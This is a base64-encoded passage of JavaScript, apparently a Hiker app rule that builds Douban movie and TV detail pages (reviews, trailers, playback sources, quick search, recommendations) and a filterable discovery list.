xyXFxuICAgICAgICB0aXRsZTogXFxcIuWJp+ivhFxcXCIsXFxyXFxuICAgICAgICBpbWc6IFxcXCJodHRwczovL2dpdGNvZGUubmV0L3FxXzQxODQ2NzU2L2hpa2VyLy0vcmF3L21hc3Rlci9pbWcv5Ymn6K+ELnBuZ1xcXCIsXFxyXFxuICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkvIy8kcGFnZXtmeXBhZ2V9I25vSGlzdG9yeSMnKS5ydWxlKCh0KSA9PiB7XFxyXFxuICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgIGRyYW1hUmV2aWV3TGlzdCh0WzBdLCB0WzFdKTtcXHJcXG4gICAgICAgIH0sIFtpLnN1YnR5cGUsIGkuaWRdKSxcXHJcXG4gICAgICAgIGNvbF90eXBlOiBcXFwiaWNvbl9yb3VuZF9zbWFsbF80XFxcIlxcclxcbiAgICB9XTtcXHJcXG5cXHJcXG4gICAgbGV0IGludHJvSXRlbXMgPSBbXTtcXHJcXG4gICAgaWYgKGkuaW50cm8pIHtcXHJcXG4gICAgICAgIGludHJvSXRlbXMgPSBbe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi4oCc4oCc4oCd4oCdPGJpZz48c3Ryb25nPuWJp+aDheeugOS7izwvc3Ryb25nPjwvYmlnPlxcXCIsXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXHJcXG4gICAgICAgICAgICBleHRyYToge1xcclxcbiAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXHJcXG4gICAgICAgICAgICB9LFxcclxcbiAgICAgICAgICAgIHVybDogJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICB9LCB7XFxyXFxuICAgICAgICAgICAgdGl0bGU6IFxcXCImbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDtcXFwiICsgaS5pbnRyby5yZXBsYWNlKC9cXFxcbi9nLCBcXFwiPGJyLz4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDtcXFwiKS5yZXBsYWNlKC9cXFxccy9nLCBcXFwiIFxcXCIpLnJlcGxhY2UoL1xcXFx0L2csIFxcXCIgXFxcIiksXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxyXFxuICAgICAgICB9XVxcclxcbiAgICB9XFxyXFxuXFxyXFxuICAgIGxldCB2aWRlb1JlbGF0ZWRJdGVtcyA9IFtdO1xcclxcbiAgICBpZiAoaS50cmFpbGVyKSB7XFxyXFxuICAgICAgICB2aWRlb1JlbGF0ZWRJdGVtcy5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnOKAneKAnTxiaWc+PHN0cm9uZz7pooTlkYo8L3N0cm9uZz48L2JpZz5cXFwiLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxyXFxuICAgICAgICAgICAgZXh0cmE6IHtcXHJcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxyXFxuICAgICAgICAgICAgfSxcXHJcXG4gICAgICAgICAgICB1cmw6ICdoaWtlcjovL2VtcHR5J1xcclxcbiAgICAgICAgfSk7XFxyXFxuICAgICAgICB2aWRlb1JlbGF0ZWRJdGVtcy5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogaS50cmFpbGVyLnRpdGxlLFxcclxcbiAgICAgICAgICAgIGltZzogaS50cmFpbGVyLmNvdmVyX3VybCxcXHJcXG4gICAgICAgICAgICB1cmw6IGkudHJhaWxlci52aWRlb191cmwsXFxyXFxuICAgICAgICAgICAgZGVzYzogaS50cmFpbGVyLnN1YmplY3RfdGl0bGUgKyBcXFwi4oCiXFxcIiArIGkudHJhaWxlci5jcmVhdGVfdGltZSxcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcIm1vdmllXzJcXFwiXFxyXFxuICAgICAgICB9KTtcXHJcXG4gICAgICAgIHZpZGVvUmVsYXRlZEl0ZW1zLnB1c2goe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiAn5p+l55yL5pu05aSaJyxcXHJcXG4gICAgICAgICAgICBpbWc6IFxcXCJodHRwczovL2dpdGNvZGUubmV0L3FxXzQxODQ2NzU2L2hpa2VyLy0vcmF3L21hc3Rlci9pbWcvbW9yZS5wbmdcXFwiLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwibW92aWVfMlxcXCIsXFxyXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5LyMvJHBhZ2V7ZnlwYWdlfSNub0hpc3RvcnkjJykucnVsZSgodCkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxyXFxuICAgICAgICAgICAgICAgIHRyYWlsZXJzKHRbMF0sIHRbMV0pO1xcclxcbiAgICAgICAgICAgIH0sIFtpLnN1YnR5cGUsIGkuaWRdKSxcXHJcXG4gICAgICAgIH0pO1xcclxcbiAgICB9XFxyXFxuICAgIGlmIChpLnZpZGVvKSB7XFxyXFxuICAgICAgICB2aWRlb1JlbGF0ZWRJdGVtcy5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnOKAneKAnTxiaWc+PHN0cm9uZz7op4bpopHor4Torro8L3N0cm9uZz48L2JpZz5cXFwiLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxyXFxuICAgICAgICAgICAgZXh0cmE6IHtcXHJcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxyXFxuICAgICAgICAgICAgfSxcXHJcXG4gICAgICAgICAgICB1cmw6ICdoaWtlcjovL2VtcHR5J1xcclxcbiAgICAgICAgfSk7XFxyXFxuICAgICAgICB2aWRlb1JlbGF0ZWRJdGVtcy5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogaS52aWRlby50aXRsZSxcXHJcXG4gICAgICAgICAgICBpbWc6IGkudmlkZW8uY292ZXJfdXJsICsgXFxcIkBSZWZlcmVyPVxcXCIgKyBpLnZpZGVvLmNvdmVyX3VybCxcXHJcXG4gICAgICAgICAgICB1cmw6IGkudmlkZW8udmlkZW9fdXJsLFxcclxcbiAgICAgICAgICAgIGRlc2M6IGkudmlkZW8uYXV0aG9yLm5hbWUgKyBcXFwi4oCiXFxcIiArIGkudmlkZW8uY3JlYXRlX3RpbWUsXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJtb3ZpZV8yXFxcIlxcclxcbiAgICAgICAgfSk7XFxyXFxuICAgICAgICB2aWRlb1JlbGF0ZWRJdGVtcy5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogJ+afpeeci+abtOWkmicsXFxyXFxuICAgICAgICAgICAgaW1nOiBcXFwiaHR0cHM6Ly9naXRjb2RlLm5ldC9xcV80MTg0Njc1Ni9oaWtlci8tL3Jhdy9tYXN0ZXIvaW1nL21vcmUucG5nXFxcIixcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcIm1vdmllXzJcXFwiLFxcclxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eS8jLyRwYWdle2Z5cGFnZX0jbm9IaXN0b3J5IycpLnJ1bGUoKHQpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgICAgICB2aWRlb0NvbW1lbnQodFswXSwgdFsxXSk7XFxyXFxuICAgICAgICAgICAgfSwgW2kuc3VidHlwZSwgaS5pZF0pLFxcclxcbiAgICAgICAgfSk7XFxyXFxuICAgIH1cXHJcXG5cXHJcXG4gICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UoZmV0Y2goZ2V0TXlWYXIoJ3FkYl9jb25maWcnKSkpO1xcclxcblxcclxcbiAgICBsZXQgYW5hbHlzaXNDb25maWdzID0gZ2V0Q29uZmlnKCdhbmFseXNpc0NvbmZpZ3MnLCBjb25maWcpO1xcclxcbiAgICBsZXQgZXh0cmFDb25maWcgPSBhbmFseXNpc0NvbmZpZ3NbYW5hbHlzaXNDb25maWdzLnVzZV0uZXh0cmEgfHwgJ3t9JztcXHJcXG4gICAgbGV0IGV4dHJhID0ge307XFxyXFxuICAgIHRyeSB7XFxyXFxuICAgICAgICBpZiAoZXh0cmFDb25maWcuc3RhcnRzV2l0aCgneycpKSBldmFsKCdleHRyYT0nICsgZXh0cmFDb25maWcpO1xcclxcbiAgICB9IGNhdGNoIChlKSB7fVxcclxcbiAgICBsZXQgdmlkZW9JdGVtcyA9IFtdO1xcclxcbiAgICB2aWRlb1VybHNNb2R1bGUodmlkZW9JdGVtcywgdHlwZSwgaWQsIFsnaWNvbl8yJywgJ2ljb25fc21hbGxfNCddLCBwYXJzZVZpZGVvVXJsTGF6eSwgaSwgZXh0cmEpO1xcclxcbiAgICBpZiAodmlkZW9JdGVtcy5sZW5ndGggPiAwKSB7XFxyXFxuICAgICAgICB2aWRlb0l0ZW1zLnVuc2hpZnQoe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi4oCc4oCc4oCd4oCdPGJpZz48c3Ryb25nPuWcqOe6v+inguecizwvc3Ryb25nPjwvYmlnPlxcXCIsXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXHJcXG4gICAgICAgICAgICBleHRyYToge1xcclxcbiAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXHJcXG4gICAgICAgICAgICB9LFxcclxcbiAgICAgICAgICAgIHVybDogJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICB9KVxcclxcbiAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgdmlkZW9JdGVtcy51bnNoaWZ0KHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnOKAneKAnTxiaWc+PHN0cm9uZz7lsJrml6DniYfmupA8L3N0cm9uZz48L2JpZz5cXFwiLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxyXFxuICAgICAgICAgICAgZXh0cmE6IHtcXHJcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxyXFxuICAgICAgICAgICAgfSxcXHJcXG4gICAgICAgICAgICB1cmw6ICd0b2FzdDovL+ecn+eahOayoeeJh+a6kCdcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH1cXHJcXG5cXHJcXG4gICAgbGV0IHF1aWNrU2VhcmNoQ29uZmlncyA9IGdldENvbmZpZygncXVpY2tTZWFyY2hDb25maWdzJywgY29uZmlnKTtcXHJcXG4gICAgbGV0IHF1aWNrU2VhcmNoSXRlbXMgPSBbXTtcXHJcXG4gICAgcXVpY2tTZWFyY2hDb25maWdzLm9yZGVyLmZvckVhY2gocXVpY2tTZWFyY2hJdGVtID0+IHtcXHJcXG4gICAgICAgIGlmIChxdWlja1NlYXJjaENvbmZpZ3NbcXVpY2tTZWFyY2hJdGVtXSkge1xcclxcbiAgICAgICAgICAgIHF1aWNrU2VhcmNoSXRlbXMucHVzaCh7XFxyXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBxdWlja1NlYXJjaEl0ZW0sXFxyXFxuICAgICAgICAgICAgICAgIGltZzogcXVpY2tTZWFyY2hDb25maWdzW3F1aWNrU2VhcmNoSXRlbV0ucGljLFxcclxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogcXVpY2tTZWFyY2hDb25maWdzLm1vZGUgfHwgJ2ljb25fc21hbGxfNCcsXFxyXFxuICAgICAgICAgICAgICAgIHVybDogJ2hpa2VyOi8vc2VhcmNoP3M9JyArIGkudGl0bGUgKyAnJnJ1bGU9JyArIHF1aWNrU2VhcmNoQ29uZmlnc1txdWlja1NlYXJjaEl0ZW1dLm5hbWVcXHJcXG4gICAgICAgICAgICB9KVxcclxcbiAgICAgICAgfVxcclxcbiAgICB9KVxcclxcbiAgICBpZiAocXVpY2tTZWFyY2hJdGVtcy5sZW5ndGggPiAwKSB7XFxyXFxuICAgICAgICBxdWlja1NlYXJjaEl0ZW1zLnVuc2hpZnQoe1xcclxcbiAgICAgICAgICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnTxzdHJvbmc+PGJpZz7lv6vpgJ/mkJzntKI8L2JpZz48L3N0cm9uZz4nLFxcclxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnLFxcclxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcclxcbiAgICAgICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxyXFxuICAgICAgICAgICAgICAgIH0sXFxyXFxuICAgICAgICAgICAgICAgIHVybDogJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgfSlcXHJcXG4gICAgICAgICAgICAvKnF1aWNrU2VhcmNoSXRlbXMudW5zaGlmdCh7XFxyXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnbGluZSdcXHJcXG4gICAgICAgICAgICB9KSovXFxyXFxuICAgIH1cXHJcXG5cXHJcXG4gICAgc2V0SG9tZVJlc3VsdCh7XFxyXFxuICAgICAgICBkYXRhOiBpbmZvSXRlbXMuY29uY2F0KHJhdGluZ0l0ZW1zKVxcclxcbiAgICAgICAgICAgIC5jb25jYXQocmVsYXRlZEl0ZW1zKVxcclxcbiAgICAgICAgICAgIC5jb25jYXQoe1xcclxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ2xpbmUnXFxyXFxuICAgICAgICAgICAgfSlcXHJcXG4gICAgICAgICAgICAuY29uY2F0KHF1aWNrU2VhcmNoSXRlbXMpXFxyXFxuICAgICAgICAgICAgLmNvbmNhdCh7XFxyXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnbGluZSdcXHJcXG4gICAgICAgICAgICB9KVxcclxcbiAgICAgICAgICAgIC5jb25jYXQodmlkZW9JdGVtcylcXHJcXG4gICAgICAgICAgICAuY29uY2F0KHtcXHJcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdsaW5lJ1xcclxcbiAgICAgICAgICAgIH0pXFxyXFxuICAgICAgICAgICAgLmNvbmNhdCh2aWRlb1JlbGF0ZWRJdGVtcylcXHJcXG4gICAgICAgICAgICAuY29uY2F0KHtcXHJcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdsaW5lJ1xcclxcbiAgICAgICAgICAgIH0pXFxyXFxuICAgICAgICAgICAgLmNvbmNhdChpbnRyb0l0ZW1zKVxcclxcbiAgICAgICAgICAgIC5jb25jYXQoe1xcclxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ2xpbmUnLFxcclxcbiAgICAgICAgICAgICAgICBleHRyYTp7XFxyXFxuICAgICAgICAgICAgICAgICAgaWQ6ICdyZWNvbW1lbmRhdGlvbnMnXFxyXFxuICAgICAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICB9KVxcclxcbiAgICAgICAgICAgIC5jb25jYXQoe1xcclxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnLFxcclxcbiAgICAgICAgICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnTxzbWFsbD48Zm9udCBjb2xvcj0jODcxZjc4PuS7peS4iuaVsOaNruadpea6kOS6juixhueTo++8jOWmguaCqOWWnOasou+8jOivt+S4i+i9veWumOaWuWFwcDwvZm9udD48L3NtYWxsPicsXFxyXFxuICAgICAgICAgICAgICAgIGRlc2M6ICfigJzigJzigJ3igJ08c21hbGw+PGZvbnQgY29sb3I9I2YyMGMwMD7mraTop4TliJnku4XpmZDlrabkuaDkuqTmtYHkvb/nlKjvvIzor7fkuo7lr7zlhaXlkI4yNOWwj+aXtuWGheWIoOmZpO+8jOS7u+S9lee7hOe7h+aIluS4quS6uuS4jeW+l+S7peS7u+S9leaWueW8j+aWueazleS8oOaSreatpOinhOWImeeahOaVtOS9k+aIlumDqOWIhu+8gTwvZm9udD48L3NtYWxsPicsXFxyXFxuICAgICAgICAgICAgICAgIHVybDogJ2h0dHBzOi8vbW92aWUuZG91YmFuLmNvbS9zdWJqZWN0LycgKyBpZCArICcvJyxcXHJcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcclxcbiAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgfSlcXHJcXG4gICAgfSlcXHJcXG4gICAgYmUoW3tcXHJcXG4gICAgICAgIGZ1bmM6IGZ1bmN0aW9uKG9iail7XFxyXFxuICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgIGxldCByZXMgPSBnZXREb3ViYW5SZXMob2JqLnVybCk7XFxyXFxuICAgICAgICAgICAgXFxyXFxuICAgICAgICAgICAgbGV0IGRldGFpbHNWaWV3Q29uZmlncyA9IGdldENvbmZpZygnZGV0YWlsc1ZpZXdDb25maWdzJyk7XFxyXFxuICAgICAgICAgICAgbGV0IGwgPSBbcmVzWzBdLHJlc1sxXSxyZXNbMl1dO1xcclxcbiAgICAgICAgICAgIGxldCBpID0gbC5tYXAoKGUgPT4ge1xcclxcbiAgICAgICAgICAgICAgICBsZXQgdHlwZSA9IGUudHlwZSxcXHJcXG4gICAgICAgICAgICAgICAgICAgIGlkID0gZS5pZCxcXHJcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlID0gZS50aXRsZTtcXHJcXG4gICAgICAgICAgICAgICAgbGV0IHVzZUNvbmZpZyA9IGRldGFpbHNWaWV3Q29uZmlnc1tkZXRhaWxzVmlld0NvbmZpZ3MudXNlXS5jb25maWc7XFxyXFxuICAgICAgICAgICAgICAgIGxldCB1cmxQYXJhbXMgPSB7fTtcXHJcXG4gICAgICAgICAgICAgICAgaWYgKHVzZUNvbmZpZy5zdGFydHNXaXRoKCd7JykpIHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGV2YWwoJ3VybFBhcmFtcyA9ICcgKyB1c2VDb25maWcpO1xcclxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgICAgICAgICAgICAgdXJsUGFyYW1zLnVybCA9ICQoXFxcImhpa2VyOi8vZW1wdHkjbm9IaXN0b3J5IyNpbW1lcnNpdmVUaGVtZSNcXFwiICsgJz90eXBlPScgKyB0eXBlICsgJyZpZD0nICsgaWQpLnJ1bGUoKHR5cGUsIGlkLCB0aXRsZSwgdXNlQ29uZmlnKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSBcXFwicGxheWxpc3RcXFwiKSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvdUxpc3QoaWQsIE1ZX1BBR0UsIDUwKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmFsKHVzZUNvbmZpZyk7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgICAgICAgICAgfSwgdHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpO1xcclxcbiAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgICAgIHJldHVybiB7XFxyXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogdGl0bGUsXFxyXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IHVybFBhcmFtcy51cmwsXFxyXFxuICAgICAgICAgICAgICAgICAgICBleHRyYTogdXJsUGFyYW1zLmV4dHJhLFxcclxcbiAgICAgICAgICAgICAgICAgICAgaW1nOiBlLnBpYyA/IGUucGljLm5vcm1hbCArIFxcXCJAUmVmZXJlcj1cXFwiICsgZS5waWMubm9ybWFsIDogZS5jb3Zlci51cmwgKyAnQFJlZmVyZXI9JyArIGUuY292ZXIudXJsLFxcclxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogZS5udWxsX3JhdGluZ19yZWFzb24gfHwgZS5yYXRpbmcudmFsdWVcXHJcXG4gICAgICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgIH0pKTtcXHJcXG4gICAgICAgICAgICBhZGRJdGVtQWZ0ZXIoJ3JlY29tbWVuZGF0aW9ucycsIGlbMl0pO1xcclxcbiAgICAgICAgICAgIGFkZEl0ZW1BZnRlcigncmVjb21tZW5kYXRpb25zJywgaVsxXSk7XFxyXFxuICAgICAgICAgICAgYWRkSXRlbUFmdGVyKCdyZWNvbW1lbmRhdGlvbnMnLCBpWzBdKTtcXHJcXG4gICAgICAgICAgICBhZGRJdGVtQWZ0ZXIoJ3JlY29tbWVuZGF0aW9ucycsIHtcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLigJzigJzigJ3igJ08YmlnPjxzdHJvbmc+55u45YWz5o6o6I2QPC9zdHJvbmc+PC9iaWc+XFxcIixcXHJcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXHJcXG4gICAgICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5LyNub0hpc3RvcnkjJykucnVsZSgodCkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgcmVjb21tZW5kYXRpb25zKHRbMF0sIHRbMV0pO1xcclxcbiAgICAgICAgICAgICAgICB9LCBbb2JqLnR5cGUsIG9iai5pZF0pLFxcclxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcclxcbiAgICAgICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxyXFxuICAgICAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICB9KVxcclxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oJ3JlY29tbWVuZGF0aW9ucycse2NvbF90eXBlOiAnbGluZScsZXh0cmE6e2lkOidub29vcCd9fSlcXHJcXG4gICAgICAgIH0sXFxyXFxuICAgICAgICBwYXJhbToge1xcclxcbiAgICAgICAgICAgIHVybDogXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcIiArIHR5cGUgKyBcXFwiL1xcXCIgKyBpZCArIFxcXCIvcmVjb21tZW5kYXRpb25zXFxcIixcXHJcXG4gICAgICAgICAgICB0eXBlOiB0eXBlLFxcclxcbiAgICAgICAgICAgIGlkOiBpZFxcclxcbiAgICAgICAgfVxcclxcbiAgICB9XSlcXHJcXG59XFxyXFxuXFxyXFxuLy/mjqjojZBcXHJcXG5mdW5jdGlvbiBmaW5kTGlzdChwYWdlLCBjb3VudCkge1xcclxcbiAgICBpZiAoIWdldE15VmFyKCdmaW5kTGlzdCcpKSBwdXRNeVZhcignZmluZExpc3QnLCAne1xcXCJpdGVtXFxcIjpcXFwibW92aWVcXFwiLFxcXCJwbGF5YWJsZVxcXCI6XFxcIjBcXFwiLFxcXCJzY29yZVxcXCI6XFxcIjAsMTBcXFwifScpO1xcclxcbiAgICBsZXQgYSA9IFtdO1xcclxcbiAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2ZpbmRMaXN0JykpO1xcclxcbiAgICBsZXQgY29sb3IgPSBnZXRDb25maWcoJ2Nob29zZUNvbG9yJyk7XFxyXFxuXFxyXFxuICAgIGxldCBpdGVtcyA9IHtcXHJcXG4gICAgICAgIOeUteW9sTogJ21vdmllJyxcXHJcXG4gICAgICAgIOeUteinhuWJpzogJ3R2J1xcclxcbiAgICB9XFxyXFxuICAgIGZvciAoaSBpbiBpdGVtcykge1xcclxcbiAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogdGVtcC5pdGVtID09PSBpdGVtc1tpXSA/ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz4nICsgaSArICcgPC9mb250PjwvYj4nIDogaSxcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcclxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6IC8vZW1wdHkjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChlKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignZmluZExpc3QnKSk7XFxyXFxuICAgICAgICAgICAgICAgIHRlbXAuaXRlbSA9IGU7XFxyXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJmaW5kTGlzdFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXHJcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcclxcbiAgICAgICAgICAgIH0sIGl0ZW1zW2ldKVxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfVxcclxcblxcclxcbiAgICBhLnB1c2goe1xcclxcbiAgICAgICAgY29sX3R5cGU6ICdibGFua19ibG9jaydcXHJcXG4gICAgfSlcXHJcXG5cXHJcXG4gICAgbGV0IHBsYXlhYmxlID0ge1xcclxcbiAgICAgICAg5YWo6YOo5b2x54mHOiAnMCcsXFxyXFxuICAgICAgICDku4XmnInniYfmupA6ICcxJ1xcclxcbiAgICB9XFxyXFxuICAgIGZvciAobGV0IHIgaW4gcGxheWFibGUpIHtcXHJcXG4gICAgICAgIGEucHVzaCh7XFxyXFxuICAgICAgICAgICAgdGl0bGU6IHRlbXAucGxheWFibGUgPT0gcGxheWFibGVbcl0gPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+JyArIHIgKyAnIDwvZm9udD48L2I+JyA6IHIsXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXHJcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOiAvL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZSkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2ZpbmRMaXN0JykpO1xcclxcbiAgICAgICAgICAgICAgICB0ZW1wLnBsYXlhYmxlID0gZTtcXHJcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImZpbmRMaXN0XFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcclxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcclxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgfSwgcGxheWFibGVbcl0pXFxyXFxuICAgICAgICB9KVxcclxcbiAgICB9XFxyXFxuXFxyXFxuICAgIGEucHVzaCh7XFxyXFxuICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPuivhOWIhuWMuumXtDonICsgdGVtcC5zY29yZS5yZXBsYWNlKCcsJywgJy0nKSArICcgPC9mb250PjwvYj4nLFxcclxcbiAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXHJcXG4gICAgICAgIHVybDogJCh0ZW1wLnNjb3JlLnJlcGxhY2UoJywnLCAnLScpLCAn6K+E5YiG5bqU5ZyoMC0xMOS5i+mXtCcpLmlucHV0KCgpID0+IHtcXHJcXG4gICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2ZpbmRMaXN0JykpO1xcclxcbiAgICAgICAgICAgIGxldCBpbnB1dHMgPSBpbnB1dC5zcGxpdCgnLScpO1xcclxcbiAgICAgICAgICAgIGlmIChpbnB1dHMubGVuZ3RoID09IDIgJiYgaW5wdXRzLmV2ZXJ5KGUgPT4gZSA+PSAwICYmIGUgPD0gMTApICYmIHBhcnNlRmxvYXQoaW5wdXRzWzBdKSA8IGlucHV0c1sxXSkge1xcclxcbiAgICAgICAgICAgICAgICB0ZW1wLnNjb3JlID0gaW5wdXQucmVwbGFjZSgnLScsICcsJyk7XFxyXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJmaW5kTGlzdFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXHJcXG4gICAgICAgICAgICAgICAgcmV